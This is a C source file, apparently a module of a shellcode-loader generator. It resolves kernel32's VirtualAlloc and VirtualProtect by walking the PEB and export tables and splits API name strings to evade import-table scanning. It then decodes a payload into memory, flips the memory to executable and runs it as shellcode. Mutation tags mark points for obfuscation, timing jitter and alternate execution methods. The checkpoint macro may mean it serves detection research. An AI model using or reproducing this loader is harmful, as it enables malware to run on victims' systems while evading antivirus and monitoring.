/* MODULE: CARRIER
 * TYPE: peb_walk
 * DESC: Import-free via PEB walking (defeats IAT scanning)
 * MUTATIONS: inline_assembly, string_splitting, loop_restructuring, protection_transition
 */
#include "../header/definitions.h"
#include "sc_checkpoint.h"

// ====================================================================
// PEB STRUCTURES
// ====================================================================
// @MUTATE:dead_code_insertion

#ifndef __NTDLL_H__
#ifndef TO_LOWERCASE
#define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)
#endif

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    void* BaseAddress;
    void* EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    HANDLE SectionHandle;
    ULONG CheckSum;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;
#endif

// ====================================================================
// MODULE RESOLVER
// ====================================================================

// @MUTATE:inline_assembly
LPVOID get_module_by_name(WCHAR* module_name) {
    PPEB peb = NULL;
    // @MUTATE:inline_assembly
#if defined(_WIN64)
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY list = ldr->InLoadOrderModuleList;
    PLDR_DATA_TABLE_ENTRY Flink = *((PLDR_DATA_TABLE_ENTRY*)(&list));
    PLDR_DATA_TABLE_ENTRY curr_module = Flink;

    // @MUTATE:loop_restructuring
    // @MUTATE:opaque_predicate
    while (curr_module != NULL && curr_module->BaseAddress != NULL) {
        if (curr_module->BaseDllName.Buffer == NULL) continue;
        WCHAR* curr_name = curr_module->BaseDllName.Buffer;
        size_t i = 0;
        // @MUTATE:loop_restructuring
        for (i = 0; module_name[i] != 0 && curr_name[i] != 0; i++) {
            WCHAR c1, c2;
            TO_LOWERCASE(c1, module_name[i]);
            TO_LOWERCASE(c2, curr_name[i]);
            if (c1 != c2) break;
        }
        if (module_name[i] == 0 && curr_name[i] == 0) {
            return curr_module->BaseAddress;
        }
        curr_module = (PLDR_DATA_TABLE_ENTRY)curr_module->InLoadOrderModuleList.Flink;
    }
    return NULL;
}

// ====================================================================
// EXPORT RESOLVER
// ====================================================================

// @MUTATE:inline_assembly
LPVOID get_func_by_name(LPVOID module, char* func_name) {
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    // @MUTATE:opaque_predicate
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (exportsDir->VirtualAddress == NULL) {
        return NULL;
    }
    DWORD expAddr = exportsDir->VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);
    SIZE_T namesCount = exp->NumberOfNames;
    DWORD funcsListRVA = exp->AddressOfFunctions;
    DWORD funcNamesListRVA = exp->AddressOfNames;
    DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;

    // @MUTATE:loop_restructuring
    for (SIZE_T i = 0; i < namesCount; i++) {
        DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
        WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));
        LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
        size_t k = 0;
        // @MUTATE:loop_restructuring
        for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
            if (func_name[k] != curr_name[k]) break;
        }
        if (func_name[k] == 0 && curr_name[k] == 0) {
            return (BYTE*)module + (*funcRVA);
        }
    }
    return NULL;
}

// ====================================================================
// CARRIER IMPLEMENTATION
// ====================================================================

int carrier() {
    // @MUTATE:timing_jitter
    // @MUTATE:benign_preamble

    // @MUTATE:string_splitting
    wchar_t kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };

    LPVOID k32 = get_module_by_name(kernel32);
    // @MUTATE:opaque_predicate
    if (!k32) return 32;

    // @MUTATE:string_splitting
    char val_str[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 };
    char vp_str[]  = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0 };

    VirtualAlloc_t myVirtualAlloc = (VirtualAlloc_t)get_func_by_name(k32, val_str);
    VirtualProtect_t myVirtualProtect = (VirtualProtect_t)get_func_by_name(k32, vp_str);

    // @MUTATE:dead_code_insertion
    // @MUTATE:opaque_predicate
    if (!myVirtualAlloc || !myVirtualProtect) return 33;

    // @MUTATE:literal_encoding
    char *dest = (char*)myVirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
    if (!dest) return 30;

    // @MUTATE:timing_jitter
    decode_payload(dest, PAYLOAD_LEN);
    // @MUTATE:api_sequence_obfuscation

    // @MUTATE:protection_transition
    DWORD old;
    if (!myVirtualProtect(dest, PAYLOAD_LEN, p_RX, &old)) return 31;
    // @MUTATE:timing_jitter

    // @MUTATE:execution_method(direct|callback|fiber|threadpool)
    ARTIFACT_CHECKPOINT("Launching");
    EXECUTE_SHELLCODE(dest);

    return 0;
}
